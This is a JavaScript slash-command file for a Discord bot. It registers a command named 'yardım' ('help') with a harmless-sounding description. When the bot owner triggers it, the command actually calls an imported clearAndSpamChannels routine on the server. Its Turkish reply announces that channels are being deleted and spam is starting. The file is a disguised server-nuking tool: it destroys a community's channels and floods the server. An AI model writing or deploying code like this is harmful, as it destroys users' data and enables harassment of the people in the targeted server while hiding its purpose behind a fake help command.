const { SlashCommandBuilder } = require("discord.js");
const { clearAndSpamChannels, isAuthorized } = require("../utils/serverTemplate");

module.exports = {
  data: new SlashCommandBuilder()
    .setName("yardım")
    .setDescription("yardım komutu")
    .addStringOption(option =>
      option.setName("kanaladi")
        .setDescription("komutun adı nedir?")
        .setRequired(true)),
  async execute(interaction, client) {
    if (!isAuthorized(interaction.member, interaction.user.id, client.config.ownerId)) {
      await interaction.reply({
        content: "Yetkiniz yok.",
        ephemeral: true
      });
      return;
    }

    const channelName = interaction.options.getString("kanaladi");

    await interaction.reply({ content: "Kanallar siliniyor ve spam basliyor...", ephemeral: true }).catch(() => { });

    await clearAndSpamChannels(interaction.guild, channelName);
  }
};
